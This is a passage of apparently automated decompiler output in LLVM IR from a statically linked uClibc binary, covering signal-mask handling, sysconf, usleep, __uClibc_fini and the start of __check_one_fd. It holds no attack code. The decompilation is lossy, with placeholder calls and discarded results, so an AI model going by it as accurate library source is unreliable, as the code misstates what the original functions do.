dec_label_pc_8061691.preheader:                   ; preds = %dec_label_pc_806166b
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8061686

dec_label_pc_8061686:                             ; preds = %dec_label_pc_8061686.dec_label_pc_8061686_crit_edge, %dec_label_pc_8061691.preheader
  %v0_8061686 = phi i32 [ %v15_80615fd, %dec_label_pc_8061691.preheader ], [ %v0_8061686.pre, %dec_label_pc_8061686.dec_label_pc_8061686_crit_edge ]
  %v1_806169126 = phi i32 [ 31, %dec_label_pc_8061691.preheader ], [ %v1_8061691, %dec_label_pc_8061686.dec_label_pc_8061686_crit_edge ]
  %v2_8061686 = mul i32 %v1_806169126, 4
  %v3_8061686 = add i32 %v2_8061686, 292
  %v4_8061686 = add i32 %v3_8061686, %v0_8061686
  %v5_8061686 = inttoptr i32 %v4_8061686 to i32*
  store i32 0, i32* %v5_8061686, align 4
  %v0_8061691.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_8061691 = add i32 %v0_8061691.pre, -1
  %v9_8061691 = icmp slt i32 %v1_8061691, 0
  store i32 %v1_8061691, i32* %edx.global-to-local, align 4
  %v1_8061692 = icmp eq i1 %v9_8061691, false
  br i1 %v1_8061692, label %dec_label_pc_8061686.dec_label_pc_8061686_crit_edge, label %dec_label_pc_8061694

dec_label_pc_8061686.dec_label_pc_8061686_crit_edge: ; preds = %dec_label_pc_8061686
  %v0_8061686.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8061686

dec_label_pc_8061694:                             ; preds = %dec_label_pc_8061686
  store i32 %v2_8061637, i32* %eax.global-to-local, align 4
  store i32 %v2_8061637, i32* %stack_var_-460, align 4
  %v4_80616a0 = call i32 @__sigaddset(i32 %v2_8061637, i32 17, i32 0, i32 0)
  store i32 %v4_80616a0, i32* %eax.global-to-local, align 4
  %v2_80616a8 = icmp slt i32 %v4_80616a0, 0
  br i1 %v2_80616a8, label %dec_label_pc_806176f, label %dec_label_pc_80616b0

dec_label_pc_80616b0:                             ; preds = %dec_label_pc_8061694
  %v2_80616b1 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_80616b1, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_80616ba = call i32 @__GI_sigaction(i32 17, i32* null, i32 %v2_80616b1)
  store i32 %v4_80616ba, i32* %eax.global-to-local, align 4
  %v2_80616c2 = icmp slt i32 %v4_80616ba, 0
  %v1_80616c4 = icmp eq i1 %v2_80616c2, false
  br i1 %v1_80616c4, label %dec_label_pc_80616ee, label %dec_label_pc_80616c6

dec_label_pc_80616c6:                             ; preds = %dec_label_pc_80616b0
  %v0_80616c6 = load i32, i32* %stack_var_-460, align 4
  %v1_80616c6 = call i32 @__errno_location(i32 %v0_80616c6)
  store i32 %v1_80616c6, i32* %eax.global-to-local, align 4
  %v1_80616cb = inttoptr i32 %v1_80616c6 to i32*
  %v2_80616cb = load i32, i32* %v1_80616cb, align 4
  store i32 %v2_80616cb, i32* @esi, align 4
  store i32 %v1_80616c6, i32* @ebx, align 4
  store i32 %v2_8061650, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80616dc = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80616dc = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80616dc, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_80616e7 = load i32, i32* @esi, align 4
  %v1_80616e7 = load i32, i32* @ebx, align 4
  %v2_80616e7 = inttoptr i32 %v1_80616e7 to i32*
  store i32 %v0_80616e7, i32* %v2_80616e7, align 4
  %v0_806177c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061772

dec_label_pc_80616ee:                             ; preds = %dec_label_pc_80616b0
  %v3_80616ee = load i32, i32* %stack_var_-420, align 4
  %v12_80616ee = icmp eq i32 %v3_80616ee, 1
  store i32 %v2_8061650, i32* @ebp, align 4
  %v2_80616fa = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80616fa, i32* @ebx, align 4
  %v1_8061701 = icmp eq i1 %v12_80616ee, false
  br i1 %v1_8061701, label %dec_label_pc_8061728, label %dec_label_pc_8061703

dec_label_pc_8061703:                             ; preds = %dec_label_pc_80616ee
  store i32 %v2_80616fa, i32* %stack_var_-460, align 4
  %v2_8061707 = call i32 @nanosleep(i32 %v2_80616fa, i32 %v2_80616fa)
  store i32 %v2_8061707, i32* %eax.global-to-local, align 4
  store i32 %v2_8061707, i32* @edi, align 4
  %v1_806170e = call i32 @__errno_location(i32 %v2_80616fa)
  store i32 %v1_806170e, i32* %eax.global-to-local, align 4
  %v1_8061716 = inttoptr i32 %v1_806170e to i32*
  %v2_8061716 = load i32, i32* %v1_8061716, align 4
  store i32 %v2_8061716, i32* @esi, align 4
  store i32 %v1_806170e, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_806171f = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_806171f = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_806171f, i32 0)
  store i32 %v4_806171f, i32* %eax.global-to-local, align 4
  %v0_8061724 = load i32, i32* @esi, align 4
  %v1_8061724 = load i32, i32* @ebx, align 4
  %v2_8061724 = inttoptr i32 %v1_8061724 to i32*
  store i32 %v0_8061724, i32* %v2_8061724, align 4
  %v0_806174e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_806174b

dec_label_pc_8061728:                             ; preds = %dec_label_pc_80616ee
  store i32 2, i32* %stack_var_-460, align 4
  %v3_806172e = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_806172e = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_806172e, i32 0)
  store i32 %v4_806172e, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  store i32 %v2_8061650, i32* @ecx, align 4
  br label %dec_label_pc_8061744

dec_label_pc_8061739:                             ; preds = %dec_label_pc_806166b
  %v2_806173b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_806173b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061744

dec_label_pc_8061744:                             ; preds = %dec_label_pc_8061728, %dec_label_pc_8061739
  %storemerge3.pre-phi = phi i32 [ %v2_80616fa, %dec_label_pc_8061728 ], [ %v2_806173b, %dec_label_pc_8061739 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v2_8061744 = call i32 @nanosleep(i32 %storemerge3.pre-phi, i32 %storemerge3.pre-phi)
  store i32 %v2_8061744, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806174b

dec_label_pc_806174b:                             ; preds = %dec_label_pc_8061703, %dec_label_pc_8061744
  %v0_806174e = phi i32 [ %v0_806174e.pre, %dec_label_pc_8061703 ], [ %v2_8061744, %dec_label_pc_8061744 ]
  %v1_806174e = icmp eq i32 %v0_806174e, 0
  br i1 %v1_806174e, label %dec_label_pc_806176b, label %dec_label_pc_8061752

dec_label_pc_8061752:                             ; preds = %dec_label_pc_806174b
  %v4_8061762 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_8061762, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061772

dec_label_pc_806176b:                             ; preds = %entry, %dec_label_pc_806174b
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061772

dec_label_pc_806176f:                             ; preds = %dec_label_pc_8061694, %dec_label_pc_806164f, %dec_label_pc_8061621
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061772

dec_label_pc_8061772:                             ; preds = %dec_label_pc_806176b, %dec_label_pc_8061752, %dec_label_pc_80616c6, %dec_label_pc_806176f
  %v0_806177c = phi i32 [ 0, %dec_label_pc_806176b ], [ %v4_8061762, %dec_label_pc_8061752 ], [ %v0_806177c.pre, %dec_label_pc_80616c6 ], [ -1, %dec_label_pc_806176f ]
  store i32 %v0_80615fc, i32* @ebx, align 4
  store i32 %v0_80615fb, i32* @esi, align 4
  store i32 %v0_80615fa, i32* @edi, align 4
  store i32 %v0_80615f4, i32* @ebp, align 4
  ret i32 %v0_806177c

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 2, 0, 1 }
  uselistorder i32 %v1_806170e, { 1, 0, 2 }
  uselistorder i32 %v2_80616fa, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8061691, { 2, 1, 0 }
  uselistorder i32 %v2_8061650, { 0, 3, 2, 5, 4, 1, 6 }
  uselistorder i32 %v2_8061637, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_806161e, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, i32*, i32)* @__GI_sigaction, { 1, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0, 2 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 10, 11, 12, 13, 14, 3, 1, 7, 8, 9, 15, 4, 5, 2, 6, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8061772, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_806176b, { 1, 0 }
  uselistorder label %dec_label_pc_806174b, { 1, 0 }
  uselistorder label %dec_label_pc_8061744, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_806179f [
    i32 0, label %dec_label_pc_80617af
    i32 1, label %dec_label_pc_8061894
    i32 2, label %dec_label_pc_80617b9
    i32 3, label %dec_label_pc_80617c3
    i32 4, label %dec_label_pc_80617cd
    i32 5, label %dec_label_pc_8061863
    i32 6, label %dec_label_pc_80617d5
    i32 7, label %dec_label_pc_8061795
    i32 8, label %dec_label_pc_8061795
    i32 9, label %dec_label_pc_8061795
    i32 10, label %dec_label_pc_8061795
    i32 11, label %dec_label_pc_8061795
    i32 12, label %dec_label_pc_8061795
    i32 13, label %dec_label_pc_8061795
    i32 14, label %dec_label_pc_8061795
    i32 15, label %dec_label_pc_8061795
    i32 16, label %dec_label_pc_8061795
    i32 17, label %dec_label_pc_8061795
    i32 18, label %dec_label_pc_8061795
    i32 19, label %dec_label_pc_8061795
    i32 20, label %dec_label_pc_8061795
    i32 21, label %dec_label_pc_8061795
    i32 22, label %dec_label_pc_8061795
    i32 23, label %dec_label_pc_8061894
    i32 24, label %dec_label_pc_8061894
    i32 25, label %dec_label_pc_80618a0
    i32 26, label %dec_label_pc_8061871
    i32 27, label %dec_label_pc_8061894
    i32 28, label %dec_label_pc_80617e7
    i32 29, label %dec_label_pc_806186a
    i32 30, label %dec_label_pc_80617df
    i32 31, label %dec_label_pc_806187f
    i32 32, label %dec_label_pc_8061894
    i32 33, label %dec_label_pc_8061894
    i32 34, label %dec_label_pc_8061894
    i32 35, label %dec_label_pc_8061878
    i32 36, label %dec_label_pc_80618a7
    i32 37, label %dec_label_pc_80618ae
    i32 38, label %dec_label_pc_80618a7
    i32 39, label %dec_label_pc_80617f1
    i32 40, label %dec_label_pc_80618b5
    i32 41, label %dec_label_pc_8061894
    i32 42, label %dec_label_pc_806187f
    i32 43, label %dec_label_pc_80618ae
    i32 44, label %dec_label_pc_80618bc
    i32 45, label %dec_label_pc_80618ae
    i32 46, label %dec_label_pc_806186a
    i32 47, label %dec_label_pc_806186a
    i32 48, label %dec_label_pc_806186a
    i32 49, label %dec_label_pc_8061894
    i32 50, label %dec_label_pc_8061894
    i32 51, label %dec_label_pc_806186a
    i32 52, label %dec_label_pc_806186a
    i32 53, label %dec_label_pc_8061894
    i32 54, label %dec_label_pc_8061894
    i32 55, label %dec_label_pc_8061894
    i32 56, label %dec_label_pc_8061894
    i32 57, label %dec_label_pc_8061894
    i32 58, label %dec_label_pc_8061894
    i32 59, label %dec_label_pc_8061894
    i32 60, label %dec_label_pc_8061894
    i32 61, label %dec_label_pc_8061894
    i32 62, label %dec_label_pc_8061894
    i32 63, label %dec_label_pc_8061894
    i32 64, label %dec_label_pc_8061894
    i32 65, label %dec_label_pc_8061894
    i32 66, label %dec_label_pc_8061894
    i32 67, label %dec_label_pc_8061795
    i32 68, label %dec_label_pc_8061795
    i32 69, label %dec_label_pc_8061878
    i32 70, label %dec_label_pc_8061878
    i32 71, label %dec_label_pc_8061878
    i32 72, label %dec_label_pc_806187f
    i32 73, label %dec_label_pc_8061886
    i32 74, label %dec_label_pc_806188d
    i32 75, label %dec_label_pc_80617fb
    i32 76, label %dec_label_pc_806188d
    i32 77, label %dec_label_pc_8061795
    i32 78, label %dec_label_pc_8061795
    i32 79, label %dec_label_pc_8061795
    i32 80, label %dec_label_pc_8061795
    i32 81, label %dec_label_pc_8061795
    i32 82, label %dec_label_pc_8061795
    i32 83, label %dec_label_pc_8061795
    i32 84, label %dec_label_pc_8061795
    i32 85, label %dec_label_pc_8061894
    i32 86, label %dec_label_pc_8061894
    i32 87, label %dec_label_pc_8061871
    i32 88, label %dec_label_pc_8061805
    i32 89, label %dec_label_pc_806180f
    i32 90, label %dec_label_pc_8061886
    i32 91, label %dec_label_pc_8061795
    i32 92, label %dec_label_pc_8061795
    i32 93, label %dec_label_pc_8061795
    i32 94, label %dec_label_pc_8061795
    i32 95, label %dec_label_pc_806186a
    i32 96, label %dec_label_pc_8061894
    i32 97, label %dec_label_pc_8061894
    i32 98, label %dec_label_pc_8061795
    i32 99, label %dec_label_pc_8061795
    i32 100, label %dec_label_pc_8061795
    i32 101, label %dec_label_pc_8061819
    i32 102, label %dec_label_pc_806185c
    i32 103, label %dec_label_pc_8061899
    i32 104, label %dec_label_pc_8061871
    i32 105, label %dec_label_pc_8061823
    i32 106, label %dec_label_pc_806187f
    i32 107, label %dec_label_pc_806187f
    i32 108, label %dec_label_pc_8061863
    i32 109, label %dec_label_pc_80618a0
    i32 110, label %dec_label_pc_80618bc
    i32 111, label %dec_label_pc_806185c
    i32 112, label %dec_label_pc_8061899
    i32 113, label %dec_label_pc_80618bc
    i32 114, label %dec_label_pc_806182d
    i32 115, label %dec_label_pc_80618b5
    i32 116, label %dec_label_pc_8061894
    i32 117, label %dec_label_pc_8061894
    i32 118, label %dec_label_pc_8061837
    i32 119, label %dec_label_pc_8061841
    i32 120, label %dec_label_pc_80618ae
    i32 121, label %dec_label_pc_8061871
    i32 122, label %dec_label_pc_8061871
    i32 123, label %dec_label_pc_8061871
    i32 124, label %dec_label_pc_8061871
    i32 125, label %dec_label_pc_8061795
    i32 126, label %dec_label_pc_8061795
    i32 127, label %dec_label_pc_8061894
    i32 128, label %dec_label_pc_8061894
    i32 129, label %dec_label_pc_8061795
    i32 130, label %dec_label_pc_8061795
    i32 131, label %dec_label_pc_8061894
    i32 149, label %dec_label_pc_8061848
  ]

dec_label_pc_8061795:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80618c1

dec_label_pc_806179f:                             ; preds = %entry
  %v1_806179f = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_80617a4 = inttoptr i32 %v1_806179f to i32*
  store i32 22, i32* %v1_80617a4, align 4
  br label %dec_label_pc_8061894

dec_label_pc_80617af:                             ; preds = %entry
  br label %dec_label_pc_80618c1

dec_label_pc_80617b9:                             ; preds = %entry
  br label %dec_label_pc_80618c1

dec_label_pc_80617c3:                             ; preds = %entry
  br label %dec_label_pc_80618c1

dec_label_pc_80617cd:                             ; preds = %entry
  %v1_80617d0 = call i32 @getdtablesize(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80617d5

dec_label_pc_80617d5:                             ; preds = %entry, %dec_label_pc_80617cd
  br label %dec_label_pc_80618c1

dec_label_pc_80617df:                             ; preds = %entry
  %v1_80617e2 = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80617e7

dec_label_pc_80617e7:                             ; preds = %entry, %dec_label_pc_80617df
  br label %dec_label_pc_80618c1

dec_label_pc_80617f1:                             ; preds = %entry
  br label %dec_label_pc_80618c1

dec_label_pc_80617fb:                             ; preds = %entry
  br label %dec_label_pc_80618c1

dec_label_pc_8061805:                             ; preds = %entry
  br label %dec_label_pc_80618c1

dec_label_pc_806180f:                             ; preds = %entry
  br label %dec_label_pc_80618c1

dec_label_pc_8061819:                             ; preds = %entry
  br label %dec_label_pc_80618c1

dec_label_pc_8061823:                             ; preds = %entry
  br label %dec_label_pc_80618c1

dec_label_pc_806182d:                             ; preds = %entry
  br label %dec_label_pc_80618c1

dec_label_pc_8061837:                             ; preds = %entry
  br label %dec_label_pc_80618c1

dec_label_pc_8061841:                             ; preds = %entry
  br label %dec_label_pc_80618c1

dec_label_pc_8061848:                             ; preds = %entry
  %v5_806184e = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8061856 = icmp slt i32 %v5_806184e, 0
  %v1_8061858 = icmp eq i1 %v2_8061856, false
  br i1 %v1_8061858, label %dec_label_pc_806186a, label %dec_label_pc_8061894

dec_label_pc_806185c:                             ; preds = %entry, %entry
  br label %dec_label_pc_80618c1

dec_label_pc_8061863:                             ; preds = %entry, %entry
  br label %dec_label_pc_80618c1

dec_label_pc_806186a:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8061848
  br label %dec_label_pc_80618c1

dec_label_pc_8061871:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80618c1

dec_label_pc_8061878:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_80618c1

dec_label_pc_806187f:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80618c1

dec_label_pc_8061886:                             ; preds = %entry, %entry
  br label %dec_label_pc_80618c1

dec_label_pc_806188d:                             ; preds = %entry, %entry
  br label %dec_label_pc_80618c1

dec_label_pc_8061894:                             ; preds = %dec_label_pc_8061848, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_806179f
  br label %dec_label_pc_80618c1

dec_label_pc_8061899:                             ; preds = %entry, %entry
  br label %dec_label_pc_80618c1

dec_label_pc_80618a0:                             ; preds = %entry, %entry
  br label %dec_label_pc_80618c1

dec_label_pc_80618a7:                             ; preds = %entry, %entry
  br label %dec_label_pc_80618c1

dec_label_pc_80618ae:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_80618c1

dec_label_pc_80618b5:                             ; preds = %entry, %entry
  br label %dec_label_pc_80618c1

dec_label_pc_80618bc:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_80618c1

dec_label_pc_80618c1:                             ; preds = %dec_label_pc_80618b5, %dec_label_pc_80618ae, %dec_label_pc_80618a7, %dec_label_pc_80618a0, %dec_label_pc_8061899, %dec_label_pc_806188d, %dec_label_pc_8061886, %dec_label_pc_806187f, %dec_label_pc_8061878, %dec_label_pc_8061871, %dec_label_pc_8061863, %dec_label_pc_806185c, %dec_label_pc_806186a, %dec_label_pc_8061841, %dec_label_pc_8061837, %dec_label_pc_806182d, %dec_label_pc_8061823, %dec_label_pc_8061819, %dec_label_pc_806180f, %dec_label_pc_8061805, %dec_label_pc_80617fb, %dec_label_pc_80617f1, %dec_label_pc_80617e7, %dec_label_pc_80617d5, %dec_label_pc_80617c3, %dec_label_pc_80617b9, %dec_label_pc_80617af, %dec_label_pc_8061795, %dec_label_pc_8061894, %dec_label_pc_80618bc
  %v0_80618c4 = phi i32 [ 255, %dec_label_pc_80618b5 ], [ 2048, %dec_label_pc_80618ae ], [ 99, %dec_label_pc_80618a7 ], [ 20, %dec_label_pc_80618a0 ], [ -128, %dec_label_pc_8061899 ], [ 1024, %dec_label_pc_806188d ], [ 4, %dec_label_pc_8061886 ], [ 32, %dec_label_pc_806187f ], [ 256, %dec_label_pc_8061878 ], [ 2147483647, %dec_label_pc_8061871 ], [ 16, %dec_label_pc_8061863 ], [ 127, %dec_label_pc_806185c ], [ 200112, %dec_label_pc_806186a ], [ 9, %dec_label_pc_8061841 ], [ 65535, %dec_label_pc_8061837 ], [ -32768, %dec_label_pc_806182d ], [ -2147483648, %dec_label_pc_8061823 ], [ 8, %dec_label_pc_8061819 ], [ 500, %dec_label_pc_806180f ], [ 4096, %dec_label_pc_8061805 ], [ 16384, %dec_label_pc_80617fb ], [ 1000, %dec_label_pc_80617f1 ], [ 32768, %dec_label_pc_80617e7 ], [ 6, %dec_label_pc_80617d5 ], [ 65536, %dec_label_pc_80617c3 ], [ 100, %dec_label_pc_80617b9 ], [ 131072, %dec_label_pc_80617af ], [ 1, %dec_label_pc_8061795 ], [ -1, %dec_label_pc_8061894 ], [ 32767, %dec_label_pc_80618bc ]
  ret i32 %v0_80618c4

; uselistorder directives
  uselistorder i32 16384, { 1, 0, 5, 6, 7, 8, 9, 10, 11, 4, 2, 3, 12 }
  uselistorder i32 65535, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32)* @__GI_getpagesize, { 4, 2, 1, 0, 3 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 124, { 2, 0, 1 }
  uselistorder i32 115, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 114, { 2, 0, 1 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 110, { 2, 0, 1, 3 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 99, { 0, 6, 1, 7, 8, 2, 3, 4, 5 }
  uselistorder i32 97, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 95, { 4, 1, 0, 2, 3 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 79, { 1, 0 }
  uselistorder i32 76, { 0, 3, 4, 5, 6, 2, 1, 7 }
  uselistorder i32 70, { 1, 2, 0 }
  uselistorder i32 66, { 0, 11, 9, 2, 3, 4, 12, 5, 10, 1, 6, 7, 8 }
  uselistorder i32 65, { 3, 9, 10, 11, 6, 7, 8, 5, 1, 0, 4, 2 }
  uselistorder i32 63, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 58, { 1, 0, 2 }
  uselistorder i32 55, { 0, 2, 1 }
  uselistorder i32 53, { 1, 0 }
  uselistorder i32 49, { 4, 0, 1, 2, 3 }
  uselistorder i32 47, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 42, { 1, 2, 0 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 29, { 1, 0 }
  uselistorder i32 26, { 2, 0, 1 }
  uselistorder i32 25, { 3, 4, 5, 6, 7, 0, 2, 8, 9, 10, 1 }
  uselistorder i32 23, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80618c1, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8061894, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_806186a, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80617e7, { 1, 0 }
  uselistorder label %dec_label_pc_80617d5, { 1, 0 }
}

define i32 @usleep(i64 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v4_80618d0 = trunc i64 %arg1 to i32
  store i32 1000000, i32* @ecx, align 4
  %div = udiv i32 %v4_80618d0, 1000000
  store i32 %div, i32* %stack_var_-8, align 4
  %v2_80618ea = ptrtoint i32* %stack_var_-8 to i32
  %v2_80618ef = call i32 @nanosleep(i32 %v2_80618ea, i32 0)
  ret i32 %v2_80618ef

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 (i32, i32)* @nanosleep, { 1, 3, 2, 4, 0 }
}

define i32 @__libc_pthread_init(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_807df08.714 to i32)
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061900 = load i32, i32* @ebx, align 4
  store i32 %v0_8061900, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8070628.715 to i32), i32 -134678056), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8070628.715 to i32), i32 -134678056), i32 2), i32 0), label %dec_label_pc_8061914, label %dec_label_pc_8061921

dec_label_pc_8061914:                             ; preds = %entry, %dec_label_pc_8061914
  %v1_806191b8 = phi i32 [ %v1_806191b, %dec_label_pc_8061914 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8070628.715 to i32), i32 -134678056), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_806191b.716 to i32), i32* %stack_var_-16, align 4
  %v5_8061914 = mul i32 %v1_806191b8, 4
  %v6_8061914 = add i32 %v5_8061914, ptrtoint (i32* @global_var_8070628.715 to i32)
  %v7_8061914 = inttoptr i32 %v6_8061914 to i32*
  %v8_8061914 = load i32, i32* %v7_8061914, align 4
  call void @__pseudo_call(i32 %v8_8061914)
  %v0_806191b.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_806191b = add i32 %v0_806191b.pre, -1
  store i32 %v1_806191b, i32* %ebx.global-to-local, align 4
  %v10_806191c = icmp eq i32 %v0_806191b.pre, 0
  %v1_806191f = icmp eq i1 %v10_806191c, false
  br i1 %v1_806191f, label %dec_label_pc_8061914, label %dec_label_pc_8061921

dec_label_pc_8061921:                             ; preds = %dec_label_pc_8061914, %entry
  %v0_8061921 = load i32, i32* @global_var_807df18.717, align 8
  %v1_8061926 = icmp eq i32 %v0_8061921, 0
  br i1 %v1_8061926, label %dec_label_pc_806192c, label %dec_label_pc_806192a

dec_label_pc_806192a:                             ; preds = %dec_label_pc_8061921
  %v0_806192a = load i32, i32* %stack_var_-16, align 4
  %v1_806192a = call i32 @unknown_0(i32 %v0_806192a)
  br label %dec_label_pc_806192c

dec_label_pc_806192c:                             ; preds = %dec_label_pc_806192a, %dec_label_pc_8061921
  %v0_806192c = load i32, i32* @global_var_807df1c.718, align 4
  %v1_8061932 = icmp eq i32 %v0_806192c, 0
  br i1 %v1_8061932, label %dec_label_pc_806193b, label %dec_label_pc_8061936

dec_label_pc_8061936:                             ; preds = %dec_label_pc_806192c
  %v2_8061936 = load i32, i32* %stack_var_-16, align 4
  %v1_8061939 = call i32 @unknown_0(i32 %v2_8061936)
  br label %dec_label_pc_806193b

dec_label_pc_806193b:                             ; preds = %dec_label_pc_8061936, %dec_label_pc_806192c
  %v2_806193b = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_806193b

; uselistorder directives
  uselistorder i32 %v1_806191b, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8061914, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_8061942 = load i32, i32* @eax, align 4
  ret i32 %v0_8061942
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8061943 = load i32, i32* @esi, align 4
  %v0_8061944 = load i32, i32* @eax, align 4
  store i32 %v0_8061944, i32* @esi, align 4
  %v0_8061946 = load i32, i32* @ebx, align 4
  store i32 %v0_8061946, i32* %stack_var_-8, align 4
  %v0_8061947 = load i32, i32* @edx, align 4
  store i32 %v0_8061947, i32* @ebx, align 4
  %v4_806194f = call i32 @__libc_fcntl(i32 %v0_8061944, i32 1, i32 %tmp6)
  %v1_8061957 = add i32 %v4_806194f, 1
  %v8_8061957 = icmp eq i32 %v1_8061957, 0
  %v1_8061958 = icmp eq i1 %v8_8061957, false
  br i1 %v1_8061958, label %dec_label_pc_8061973, label %dec_label_pc_806195a

dec_label_pc_806195a:                             ; preds = %entry
  %v0_806195c = load i32, i32* @ebx, align 4
  %v4_8061962 = trunc i32 %v0_806195c to i8
  %v5_8061962 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_806e840.719 to i32), i8 %v4_8061962, i32 %v1_8061957)
  %v1_806196a = load i32, i32* @esi, align 4
